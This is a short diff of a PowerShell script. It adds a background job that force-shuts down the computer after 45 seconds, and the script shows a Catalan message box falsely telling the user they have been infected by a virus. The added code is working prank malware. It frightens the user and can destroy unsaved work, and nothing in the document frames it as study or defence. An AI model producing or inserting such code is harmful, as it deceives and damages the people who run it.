@@ -8,6 +8,12 @@ function Show-MessageBox {
 
 ######################
 
+Start-Job -ScriptBlock {
+    Start-Sleep -Seconds 45
+    Stop-Computer -Force
+}
+
+
 Start-Sleep -Seconds 2
 
 [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
